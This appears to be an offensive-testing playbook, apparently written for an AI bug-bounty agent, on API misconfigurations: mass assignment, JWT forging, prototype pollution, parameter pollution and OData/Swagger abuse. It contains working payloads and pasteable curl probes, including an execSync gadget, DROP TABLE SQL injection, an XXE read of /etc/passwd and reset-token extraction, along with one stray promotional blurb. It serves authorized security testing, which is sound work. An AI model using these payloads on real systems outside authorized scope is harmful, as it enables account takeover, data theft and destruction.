---
name: hunt-api-misconfig
description: "Hunt API security misconfiguration — mass assignment, prototype pollution, HTTP verb tampering. Mass assignment: send {is_admin:true, role:admin, verified:true} on profile/account/reset endpoints — server blindly applies. JWT signature/crypto forging (alg:none, key confusion, kid/jku) is owned by hunt-jwt-crypto; this skill covers only non-crypto JWT handling. Prototype pollution: __proto__ injection in JSON merge / Object.assign / lodash _.merge → polluted prototype reaches sink (RCE in Node, XSS in browser). HTTP verb: GET-bypass-CSRF, X-HTTP-Method-Override, TRACE enabled. Detection: API responses with extra fields, JWTs in headers (decode at jwt.io). CORS misconfiguration (reflect-any-origin, null origin, subdomain-regex bypass, postMessage) is owned by hunt-cors. Use when hunting API misconfigs, mass-assignment, prototype pollution (JWT crypto → hunt-jwt-crypto)."
sources: hackerone_public, owasp_api_top10_2023, public_research
report_count: 0
---
> **appsec-fyi supplement (source-cited, 2026 CVEs):** `references/appsec-fyi-techniques.md` —
> additive per-class technique list from https://appsec.fyi. Owner methodology below still wins.

> **Extra attack variants** (OpenEMR + PHP-core advisories — see §A/§G): `skills/security/exploit-cookbook/references/openemr-php-advisory-techniques.md`

> **Centrally-ordered variant matrix (mass-assignment / verb+param pollution / prototype pollution / OData / OpenAPI exposure):** `references/misconfig-variant-matrix.md` — tiap varian = payload + signal + proof bar, sweep cepat per target. Kasus spesifik (DRF/PostgREST/Plotly) tetap di refs masing-masing.
> `references/supabase-postgrest-attack-surface.md` — the `/rest/v1/<table>` existence oracle
> (`404` absent vs `401 42501` exists-but-denied), Edge Function + RPC enumeration,
> `/auth/v1/settings` signup/autoconfirm reading, the **`anon` vs `authenticated` role boundary**
> (revoking from the shipped key while `authenticated` still reads is the classic bug), response
> differentials as state oracles with the ordering test that sizes them, and the scope wording
> ("bulk submissions against the form") that usually rules out the spam avenue.


## 12. API SECURITY MISCONFIGURATION

### Mass Assignment
```javascript
User.update(req.body)  // body has {"role": "admin"} → privilege escalation
```

### JWT None Algorithm
```python
header = {"alg": "none", "typ": "JWT"}
payload = {"sub": 1, "role": "admin"}
token = base64(header) + "." + base64(payload) + "."  # no signature
```

### JWT RS256 → HS256 Algorithm Confusion
```python
# Get server's public key from /.well-known/jwks.json
# Sign token with public key as HMAC secret
token = jwt.encode({"sub": "admin", "role": "admin"}, pub_key, algorithm="HS256")
# Server uses RS256 key as HS256 secret → accepts it
```

### Prototype Pollution
```javascript
// Server-side — Node.js merge without protection
{"__proto__": {"admin": true}}
{"constructor": {"prototype": {"admin": true}}}
// URL: ?__proto__[isAdmin]=true&__proto__[role]=superadmin
```

For server-side prototype pollution, hunt for an object merge primitive first, then a sink. Favor
JSON/object update endpoints such as profile, address, preferences, settings, cart, admin job, import,
or webhook configuration. Do not stop at a 200 response to `__proto__`; prove that polluted prototype
state reaches a later operation.

Hunt sequence:

1. **Find an object-update endpoint.** Prefer endpoints that accept many named fields or JSON objects.
   Try both JSON and form encodings when the app accepts forms. Include CSRF/session fields when needed.
2. **Pollute harmless marker properties.** Send variants such as:

```
{"__proto__":{"polluted":"pp-1337"}}
{"constructor":{"prototype":{"polluted":"pp-1337"}}}
__proto__[polluted]=pp-1337
constructor[prototype][polluted]=pp-1337
```

3. **Trigger a separate sink.** After pollution, request account/profile/admin/job/export/search/render
   endpoints and compare with baseline. Strong signals include changed JSON defaults, unexpected fields,
   server errors mentioning object properties, changed job output, template/render errors, or command/job
   behavior changes.
4. **Escalate only through learned sinks.** Candidate properties depend on the sink:

```
{"__proto__":{"json spaces":10}}
{"__proto__":{"status":555}}
{"__proto__":{"isAdmin":true,"role":"admin"}}
{"__proto__":{"shell":"/bin/bash","argv0":"node","NODE_OPTIONS":"--inspect"}}
{"__proto__":{"execArgv":["--eval","process.mainModule.require('child_process').execSync('id')"]}}
```

5. **For exfiltration labs or real impact, prefer non-destructive proof.** If an admin job, diagnostic,
   export, or rendering endpoint consumes polluted defaults, use a marker or environment/secret read only
   when authorized. In production, stop at a controlled marker unless scope explicitly permits data access.

### Server-Side Parameter Pollution in Backend URL / REST URL Construction

Use this when a frontend form or endpoint appears to call a server-side API on your behalf
(password reset, account lookup, profile fetch, product lookup, stock check, search). The bug is not
ordinary client-side query pollution. The server takes your input and interpolates it into a backend
URL path or query string, such as:

```
/api/internal/users/<username>/field/email
/api/users/<id>
/api/users?username=<username>&field=email
```

Hunt sequence:

1. **Find the flow and read the client request.** Fetch the page and any referenced JavaScript. Look
   for form actions, `fetch(...)`, hidden CSRF fields, and the exact parameter name the browser sends.
   If there is a reset/account form, test known usernames first to learn the normal success/error shape.
2. **Determine whether input lands in a backend path or query.** Send URL metacharacters in the input:
   `#`, `?`, `&x=y`, `/`, `../`, and encoded forms `%23`, `%3f`, `%26x=y`, `%2f`, `%2e%2e%2f`.
   Distinct errors such as `Invalid route`, `API definition`, `unsupported field`, or changed returned
   fields mean your value is being interpreted by a server-side URL router, not merely validated as text.
3. **Use path traversal to move inside the server-side URL.** If `username/../other-user` changes the
   referenced account, the input is in a REST path segment. Then try appending route fragments such as
   `/field/email`, `/field/id`, `/field/username`, `/field/passwordResetToken`, and terminate the rest
   of the original backend path with `#` or `%23` when the backend URL parser honors fragments.
4. **Discover API documentation from errors.** When an error says to consult the API definition, probe
   common documentation/spec paths: `/openapi.json`, `/swagger.json`, `/api-docs`, `/api/swagger.json`,
   `/swagger/v1/swagger.json`, `/v3/api-docs`, and path-traversal variants that attempt to reach the
   spec from the vulnerable backend route. A spec or descriptive route error tells you valid resources
   and field names.
5. **Exploit only to prove impact.** For password reset/account lookup flows, the strongest proof is a
   sensitive field such as a reset token or secret for another user, then using that token in the normal
   application flow to complete account takeover. Do not stop at `Invalid route`; use errors as routing
   feedback.

Payload patterns to try, adapted to the observed parameter name:

```
username=administrator%23
username=administrator%3f
username=administrator%2f..%2fvictimuser
username=administrator/../victimuser
username=administrator/field/email%23
username=administrator/field/id%23
username=administrator/field/passwordResetToken%23
username=administrator%2ffield%2fpasswordResetToken%23
```

### CORS Exploitation
```bash
# Test: reflected origin + credentials
curl -s -I -H "Origin: https://evil.com" https://target.com/api/user/me
# If: Access-Control-Allow-Origin: https://evil.com + Access-Control-Allow-Credentials: true
# → CRITICAL: attacker reads credentialed responses
```

---

## OData $filter / $select / $expand WAF-Blacklist Bypass (2024-2026 surface)

OData (Open Data Protocol) is the query layer behind **SharePoint, Microsoft Dynamics 365 / Power Platform, SAP NetWeaver Gateway / Fiori,** and any ASP.NET WebAPI project using `Microsoft.AspNetCore.OData`. It exposes SQL-shaped query operators (`eq`, `ne`, `and`, `or`, `substringof`, `startswith`, `tolower`, `concat`, `replace`) that look SQL-ish but are NOT SQL — meaning keyword-blacklist WAFs routinely fail open on OData traffic.

### Attack class 1 — Boolean-logic blind extraction via `startswith` / `substringof`

```
GET /_api/data/contacts?$filter=startswith(adx_identity_passwordhash,'a')
GET /_api/data/contacts?$filter=startswith(adx_identity_passwordhash,'aa')
```

Iterate prefix character-by-character; cardinality of the response (or `@odata.count`) is the boolean oracle that confirms the prefix is correct. No SQLi engine needed, no `'`/`--` characters — the WAF sees only legitimate OData keywords. Extracted Microsoft Dynamics 365 / Power Apps Portals **password hashes, names, emails, addresses, financial data** in Dec 2023; Microsoft patched May 2024. ([Stratus Security writeup](https://www.stratussecurity.com/post/critical-microsoft-365-vulnerability), [The Hacker News coverage Jan 2025](https://thehackernews.com/2025/01/severe-security-flaws-patched-in.html))

### Attack class 2 — `$orderby` / `$select` column-disclosure bypass

```
GET /api/data/v9.0/contacts?$orderby=emailaddress1 desc&$select=fullname
```

`$orderby` accepts column names the user has no `$select` permission for, but the engine still sorts on them — the returned order leaks the protected column. Column-level ACLs are enforced on the projection (`$select`) but NOT on `$orderby` / `$filter` — same protected column, different code path. Second Stratus finding in the same Dynamics 365 disclosure; "more dangerous than the first because it directly returned the data" per Stratus.

### Attack class 3 — `$batch` multipart/mixed → per-request WAF signatures miss sub-operations

```
POST /odata/$batch  Content-Type: multipart/mixed; boundary=batch_1
--batch_1
Content-Type: application/http
GET Users?$filter=1 eq 1 HTTP/1.1
--batch_1--
```

WAFs that scan only the outer request body (or that don't natively parse `multipart/mixed`) skip every inner operation. ModSecurity refused `multipart/mixed` historically ([Issue #3296](https://github.com/owasp-modsecurity/ModSecurity/issues/3296)); F5 added native batch parsing only in Advanced WAF v16.1 ([F5 SAP-Fiori advisory](https://www.f5.com/company/blog/securing-sap-fiori-http-batched-requests-odata-with-f5-advance)). The 2025 WAFFLED paper ([arXiv 2503.10846](https://arxiv.org/html/2503.10846v1)) generalises the parsing-discrepancy bypass class across 5 major WAFs.

### Attack class 4 — Encoded / non-canonical operator → keyword-blacklist bypass

```
GET /api?%24filter=Name%20eq%20'x'%20or%201%20eq%201   # URL-encoded $
GET /api?%2524filter=...                                # double-encoded
GET /Users(1)/$value                                    # path-segment style
```

Mixed-case operators (`Eq`, `EQ`) and obscure ones (`substringof`, `tolower`, `concat`, `replace`) look unlike `SELECT`/`UNION` so SQLi-keyword signatures never fire. WAFs that key on the literal string `$filter` see neither form — but the OData server normalises both before evaluating the predicate. Documented since Kalra Black Hat AD 2012; canonical OData-vs-WAF impedance mismatch. ([OWASP Double Encoding](https://owasp.org/www-community/Double_Encoding))

### Attack class 5 — OData → real SQLi when library passes filter raw

```
$filter=Name eq 'x'); DROP TABLE Users--'
```

Only triggers when the OData layer string-concatenates into SQL instead of using LINQ. Documented in [OData/WebApi Issue #2352](https://github.com/OData/WebApi/issues/2352). The XML-deserialisation variant: **CVE-2019-17554** (Apache Olingo OData 4.0.0-4.6.0, XXE via `<!DOCTYPE foo [<!ENTITY x SYSTEM "file:///etc/passwd">]>` in `application/xml` body, CVSS 7.5). DoS variant: **CVE-2018-8269** (Microsoft.Data.OData deep `$filter` recursion → stack overflow).

### Bonus — `$expand` navigation-property IDOR

```
GET /Orders?$expand=Customer($expand=PaymentMethods($expand=Card))
```

Authorisation decorators applied to top-level entity sets; the engine joins along navigation properties without re-checking ACL on the joined entity. Same root cause as the 2021 PowerApps Portals 38M-record mass leak ([UpGuard writeup](https://www.upguard.com/breaches/power-apps)).

### Detection heuristics

- Response headers: `OData-Version: 4.0` / `DataServiceVersion: 3.0`; URL paths `/_api/`, `/odata/`, `/_vti_bin/`, `/api/data/v9.x/`, `/sap/opu/odata/`.
- Try `$metadata` → if anonymous, the full schema (entity sets, navigation properties, function imports) is yours.
- Probe each entity set with `$filter=1 eq 1`, `$top=1`, `$select=*`, then `$orderby=<column-you-shouldnt-see>` for column-level ACL.
- Send the same payload three ways (`$filter=`, `%24filter=`, `%2524filter=`) and through `$batch` — divergent WAF behaviour confirms the parser-discrepancy bug.

---

## NSwag / Swagger / OpenAPI Spec Exposure (2024-2026 surface)

NSwag is the Swagger/OpenAPI toolchain for ASP.NET Core. Default routes (`/swagger`, `/swagger/v1/swagger.json`, `/swagger/index.html`) ship enabled in many .NET 6/7/8 projects and developers leave them on in production. The exposed spec discloses every endpoint, HTTP methods, parameter names + types + formats + max-lengths, models, validation rules — a complete attack-map in JSON.

### Default discovery paths (cross-references `web2-recon`)

```
# NSwag / Swashbuckle (ASP.NET Core)
/swagger, /swagger/index.html, /swagger/v1/swagger.json, /swagger/v2/swagger.json, /swagger/v3/swagger.json
/swagger-ui, /swagger-ui/, /swagger-ui.html, /api-docs
/nswag, /nswag/index.html, /api/swagger, /api/swagger.json, /api/openapi.json

# Generic OpenAPI
/openapi, /openapi.json, /openapi.yaml, /.well-known/openapi.json

# Java / Spring (Springfox / springdoc)
/v2/api-docs, /v3/api-docs, /v3/api-docs.yaml, /swagger-resources

# Python (FastAPI / Connexion)
/docs, /redoc, /openapi.json

# Quarkus
/q/openapi, /q/swagger-ui

# GraphQL adjacent
/graphql, /graphiql, /playground, /altair, /voyager
```

Tools: `kiterunner` natively eats OpenAPI; `sj` (Swagger Jacker), `apidetector`, `XSSwagger`.

### Attack chains

**A. Spec disclosure → mass IDOR / BOLA.** Spec lists every `GET /api/v1/users/{userId}/...`. `jq '.paths | keys' swagger.json` → swap `{userId}` for victim's ID via Autorize/`ffuf -mc 200`. Common case: spec leaks `/api/admin/users/{id}/reset-password` documented but missing `[Authorize(Roles="Admin")]` on the controller — low-priv ATO.

**B. Spec disclosure → mass-assignment payload construction.** `components.schemas.UserUpdateDto` enumerates every model field including `isAdmin`, `emailVerified`, `tenantId`, `role`. Attacker copies the schema verbatim into `PATCH /users/me` and adds the privileged fields. Server's `[FromBody]` binder accepts them when DTOs aren't split into read-vs-write models.

**C. Hidden endpoints.** Specs document `/internal/*`, `/debug/*`, `/v0/*`, `/legacy/*` routes that no front-end UI references. Reachable but uncovered by WAF rules and often skipped during auth reviews.

**D. Swagger UI configUrl takeover.** Swagger UI loads its config from `?configUrl=`. If unsanitised, attacker hosts an evil OpenAPI spec, sends victim a link to the *legitimate* Swagger UI with `?configUrl=https://evil/spec.json`. Spec routes point back at the legitimate origin so the victim's "Try It Out" clicks fire same-origin authenticated requests. ([HackerOne #3124103 — U.S. DoD Swagger UI Injection, May 2025](https://hackerone.com/reports/3124103))

### Disclosed cases

- **CVE-2018-25031** — Swagger UI ≤ 4.1.2 spec-injection via URL parameter; affects org.webjars:swagger-ui broadly (embedded in Swashbuckle and NSwag bundles).
- **Swagger UI DOM XSS (3.14.1 → 3.38.0)** — outdated bundled DOMPurify + remote-spec-load → arbitrary JS in victim browser ([Vidoc Security Lab writeup](https://blog.vidocsecurity.com/blog/hacking-swagger-ui-from-xss-to-account-takeovers), [PortSwigger Daily Swig](https://portswigger.net/daily-swig/widespread-swagger-ui-library-vulnerability-leads-to-dom-xss-attacks)). Reported live on PayPal, Atlassian, Microsoft, GitLab, Yahoo.
- **HackerOne #3124103** — U.S. Department of Defense, Swagger UI Injection (May 2025).
- **HackerOne #2534300** — Ionity GmbH, HTML injection in Swagger UI.
- **HackerOne #1656650** — Reflected XSS via Swagger UI `url=` parameter.
- **CloudSEK threat-intel (2024)** — actors abuse exposed `swagger-ui` to invoke a verified-business WhatsApp send-message endpoint, impersonating the company to its customers. 6,000+ exposed Swagger UI instances on Shodan at time of writing. ([CloudSEK report](https://www.cloudsek.com/threatintelligence/threat-actors-use-exposed-swagger-ui-to-misuse-a-companys-endpoints-and-target-customers))
- **CVE-2023-38337** — `rswag` (Ruby Swagger toolchain) directory traversal — reminder that the spec endpoint is itself an attack surface.

### E. Spec with no `securitySchemes` → the "private" route groups are usually ungated (highest yield)

Before anything else, read the spec's own auth declaration:

```
jq '{security: .security, schemes: .components.securitySchemes}' swagger.json
```

`null` for both is the signal. When a spec declares no scheme, the routes it documents usually ARE
the app's real (non-UI) API, and the groups *named* `/private/`, `/internal/`, `/grafana/`,
`/admin/` are frequently reachable with no credential at all — the naming is aspirational, not
enforced. Call every path in those groups with a plain GET and sort by status; 200 is the bug.
Do this before you write a single payload for the "interesting-looking" routes.

Two shape facts worth carrying:

- **The spec URL is not always `/openapi.json`.** When `/docs` serves Swagger UI, read
  `/docs/swagger-initializer.js` and take its `url:` value. Observed live: `/docs/json` (Fastify
  `@fastify/swagger`) and `/api-docs/openapi.json` (NestJS). Guessing the default, getting 404, and
  concluding "no spec" is a false negative — you guessed.
- **A staging twin usually mirrors prod.** Once one host in a `*.api.` group is exposed, test
  `<svc>.staging-api.` / `<svc>.dev-api.` for the same route group before writing up. Both being
  exposed is part of the finding, not a separate one.

Fastify validation errors are a free parameter oracle: a 400 reading
`querystring must have required property 'startDate'`, or
`params/vaultId must match pattern "^0x[a-fA-F0-9]{40}$" / "^[1-9A-HJ-NP-Za-km-z]{32,44}$"`, hands
you the exact param name, type and accepted formats. Where the spec says `format: date-time`, send
ISO-8601 (`2026-01-01T00:00:00.000Z`); a bare `YYYY-MM-DD` fails validation and reads like a dead
endpoint.

Impact framing that survives triage: the bug is **not** "the OpenAPI spec is public" — many teams
accept that and will close it. It is "route group X, which the spec itself names `private`, serves N
records of <data class> to an anonymous GET". Lead with the count and the data class
(`vaults/list → 466 vaults, 163 owner/depositor wallet addresses, 85 KB`), and paste the
unauthenticated request next to it. Read-only proof only; do not call the write-shaped endpoints in
the same group (`POST /fee-claim`, `/set-module`, `/migrate`) — name them as reachable-but-untested.

### Detection checklist

1. httpx-probe every path above across the full subdomain set; flag 200 with `Content-Type: application/json` AND body matching `"swagger"` or `"openapi"`.
2. For every hit: `jq '.paths | keys' swagger.json` → feed to kiterunner / Autorize.
3. `jq '.components.schemas' swagger.json` → mass-assignment field candidates.
4. Banner the Swagger UI HTML for version string; map to the CVE-2018-25031 / DOM-XSS table.
5. Test `?configUrl=` and `?url=` parameter handling on every Swagger UI hit.

---

## OWASP Top 10:2025 anchor (added 2026-10-30)

API misconfiguration is **A02:2025 Security Misconfiguration** — which **jumped from #5 to #2** in
the 2025 revision. That is a real planning signal: misconfiguration is now the second-most-common
critical risk category, ahead of injection.

Related categories this class feeds: **A01 Broken Access Control** (a misconfigured authz layer is
an A01 finding), **A04 Cryptographic Failures** (JWT alg-none / weak secrets), and **A10 Mishandling
of Exceptional Conditions (NEW)** — an unhandled error on a misconfigured endpoint is a CWE-636
fail-open, citable separately.

Full map + score tables: `security/exploit-cookbook/references/owasp-top10-2025-asvs5-access-auth.md`

## Minimum 5 probes (wajib sebelum kelas ini boleh N/A)

| # | Probe | Kenapa ini dulu |
|---|---|---|
| 1 | Mass assignment: tambah field `role`/`isAdmin`/`balance`/`price` di body update profil | Privilege & pricing lewat field tersembunyi |
| 2 | Verbose error/stack trace: kirim tipe salah (array ke string, null ke int) | Stack trace bocorkan path, versi, query |
| 3 | Method override: `X-HTTP-Method-Override: PUT` pada endpoint GET-only | Authz sering cuma di satu method |
| 4 | Debug/diagnostic endpoint: `/debug`, `/actuator`, `/_debug`, `/api/debug` | Sering lupa auth di route internal |
| 5 | Response over-fetch: bandingkan field yang dikembalikan vs yang diminta UI | Field sensitif (hash, token, email internal) ikut keluar |

**Aturan:** kalau salah satu probe belum dijalankan, kelas ini **belum boleh** ditulis
N/A. N/A harus menyebut probe mana yang sudah dicoba dan hasilnya.

## Gate 0 Validation

1. **Apa yang bisa dilakukan penyerang SEKARANG?** Sebutkan konkret: "Penyerang tak terautentikasi bisa menambah field `role=admin` pada `POST /api/users` dan mendapatkan akun dengan hak admin" — bukan "mungkin bisa eskalasi hak".
2. **Apa yang hilang dari korban?** Petakan ke CIA: kerahasiaan (data terbaca), integritas (data diubah), ketersediaan (layanan mati). Jawaban samar gagal.
3. **Bisa direproduksi 10 menit dari nol?** Tulis langkah reproduksi sebelum kirim. Kalau butuh state khusus, dokumentasikan kondisinya.

## Eskalasi wajib (jangan berhenti di kelas ini)

**Primitif:** field/parameter tak seharusnya diterima

**Teknik pengembangan:** mass assignment role -> privesc; field sensitif -> data exposure

**Eskalasi ke:** `hunt-auth-bypass` · `hunt-ato` · `hunt-business-logic`

**Depth target:** L2 -> L4

Satu temuan di kelas ini WAJIB menyebut eskalasi berikutnya (atau alasan primitif habis).
Lihat `exploit-chain-graph` + `exploit-depth` (L0-L5). `depth_gate.py` memblokir temuan
yang buktinya cuma status code.

## Runnable probes

Commands you can paste. `<TARGET>`/`<RPC>` are placeholders — fill them
from recon, do not guess endpoints.

```bash
# 0) enumerate the real API surface (not the UI)
printf '%s\n' 'https://<TARGET>' | katana -d 3 -jc -silent | grep -iE '/api/|/v[0-9]/' | sort -u > api.txt
wc -l api.txt

# 1) MASS ASSIGNMENT — add privileged fields to your OWN update request
curl -sS -X PATCH https://<TARGET>/api/users/me -H 'Content-Type: application/json' -H "Authorization: Bearer $TOK" \
  -d '{"name":"x","role":"admin","isAdmin":true,"plan":"enterprise","balance":999999,"verified":true}' \
  -o me.json -w '%{http_code}\n'
jq '{role,isAdmin,plan,balance,verified}' me.json    # did any privileged field persist?

# 2) VERB TAMPERING — the authz that exists only on one method
for m in GET POST PUT PATCH DELETE; do
  curl -sS -o /dev/null -w "$m %{http_code}\n" -X $m https://<TARGET>/api/admin/users \
    -H "Authorization: Bearer $TOK"
done

# 3) METHOD OVERRIDE — gateways honour this, handlers often don't
curl -sS -o /dev/null -w '%{http_code}\n' -X POST https://<TARGET>/api/admin/users \
  -H 'X-HTTP-Method-Override: DELETE' -H "Authorization: Bearer $TOK"

# 4) VERSION DOWNGRADE — the legacy route with weaker authz
for v in /api/v1/users /api/v2/users /api/internal/users /api/users; do
  curl -sS -o /dev/null -w "$v %{http_code}\n" "$v" 2>/dev/null
  curl -sS -o /dev/null -w "$v(noauth) %{http_code}\n" "https://<TARGET>$v"
done

# 5) VERBOSE ERROR + DEBUG ENDPOINTS
curl -sS -X POST https://<TARGET>/api/users -H 'Content-Type: application/json' -d '{"name":[1,2]}' -o err.json -w '%{http_code}\n'
grep -oiE 'stack|trace|at [a-z]+\.|/home/|C:\\\\|SQLSTATE|Exception' err.json | head
for p in /debug /api/debug /actuator /api/actuator/env /_debug /metrics; do
  curl -sS -o /dev/null -w "$p %{http_code}\n" "https://<TARGET>$p"
done

# 6) RESPONSE OVER-FETCH — compare returned fields vs what the UI renders
curl -sS https://<TARGET>/api/users/me -H "Authorization: Bearer $TOK" | jq -r 'paths(scalars)|join(".")' | sort | head -40
```

**Proof bar:** a field that persists (mass assignment), a method that returns
protected data (verb tampering), or a legacy route that answers unauthenticated.
A 200 with the same body as the baseline is the #1 N/A in this class — diff the body.

---

## Related Skills & Chains

- **`hunt-ato`** — Mass assignment on signup/profile is the fastest path to admin. Chain primitive: API mass assignment + `hunt-ato` → `role=admin` set on signup → ATO via privileged role on first login.
- **`hunt-auth-bypass`** — JWT flaws collapse the entire auth layer. Chain primitive: JWT `alg=none` + `hunt-auth-bypass` → impersonate any user by setting `sub` to victim ID, no signature required.
- **`hunt-rce`** — Prototype pollution gadgets in Node.js dependencies (lodash, mongoose, jQuery) reach `child_process.spawn`. Chain primitive: Prototype pollution (`__proto__.shell=true`) + `hunt-rce` (Node.js gadget chain) → RCE on the API node.
- **`hunt-subdomain`** — CORS regex with wildcard subdomain trusts a takeoverable host. Chain primitive: CORS allowlist `*.target.com` + subdomain takeover → attacker-controlled origin reads credentialed API responses.
- **`security-arsenal`** — Load the JWT Attack Payloads section (alg=none, kid path traversal, JWK injection, embedded JWK) and the Mass-Assignment Field Wordlist (`is_admin`, `role`, `verified`, `permissions`, `org_id`, `tenant_id`).
- **`triage-validation`** — Apply the Server-Policy-vs-State gate: a permissive CORS header alone is informational; demonstrate actual cross-origin credentialed read of sensitive data before reporting.


---

## ➕ Reference — runtime API recon (SPA/MPA route + endpoint harvesting)

- `references/drf-browsable-api-recon.md` — **Django REST Framework targets**: the browsable renderer as
  a schema oracle. `OPTIONS` gives per-method field specs where `read_only:true` is a free map of which
  mass-assignment keys the serializer silently drops; `Accept: text/html` gives the real form, whose
  `<select>`s expose **enum slugs** (`directive`: root/redirect/proxy/uwsgi/webdav/ws/error_page/svn)
  and — when the serializer queryset is not tenant-scoped — **other tenants' FK rows**. Plus the
  error-body-as-spec table, the **create-vs-update** differential (create unvalidated, update validated
  against a global cap instead of the paid plan) and the silent-ignore-vs-enforce rule (a `200` that
  changed nothing is protection, not a win).

- `references/plotly-dash-callback-exposure.md` — **Plotly Dash** apps (very common for internal
  analytics/finance dashboards). `GET /_dash-dependencies` hands over the whole callback graph (296
  callbacks live, unauthenticated) and `POST /_dash-update-component` executes callbacks — including,
  in the worked case, the login callback, turning it into an unthrottled password oracle (20/20 HTTP
  200, no lockout). Covers the exact request shape, the `Referer`/`Origin` barrier that is NOT auth,
  how to map the per-callback allowlist, and the value-type trap that returns 500 instead of 401.
- `references/api-runtime-recon.md` — for targets whose API surface hides behind a JS bundle and the
  normal endpoint list is not enough. Covers the static/runtime two-layer model, the hard rule about
  never dragging a >500 KB bundle into context, **Phase 1b parameter reverse-engineering** (anchor-window
  grep, binding layer, the three packing questions), the three auth gates, the hook/stub strategy,
  coverage click-through + parameter trigger matrix, and permission-tree reconstruction.
  Outputs are designed to feed the dual graph (`autonomous-exploration`).
  *Clean-room re-expression of the ARTEX `api-recon` methodology (AGPL-3.0); our own text.*

---

## 2026 techniques (dork pass 2026-10-18)

- **CVE-2026-105844** — Payload CMS `@payloadcms/plugin-import-export` < 3.88.0:
  **unauthenticated prototype pollution** (CWE-1321) reaching full REST read/write.
  The vulnerable `getSelect()` walks dot-paths on a plain object, so a `fields` value
  containing `__proto__.overrideAccess` attaches to `Object.prototype`; every later
  operation that merges `{}` with access options then inherits `overrideAccess: true`.
  Lesson: the *impact* of prototype pollution is decided by what the app merges
  afterwards — hunt for a merge point that reads an access/role flag, not just the
  pollution sink.


## 2026 sweep (dork pass 2026-10-18 — 1 repo)

- **xeno JSON response inspector — Chrome extension for API debugging / web security** (`SEYKOOOOOO/xeno-json-response-inspector` ★70)
  - 🛎️ **Round-the-Clock Assistance** — Documentation and support channels maintained continuously, because investigation rarely respects office hours.


## Critical severity anchor (kelas ini bisa Critical — syaratnya)

Mass assignment ke field privileged (role/is_admin/balance) → priv-esc; verbose error + stack trace → source path + versi → CVE; Swagger/OpenAPI publik tanpa auth → pemetaan penuh surface. Kalibrasi: `{}` di Swagger = by design; debug endpoint tanpa data sensitif = Info.
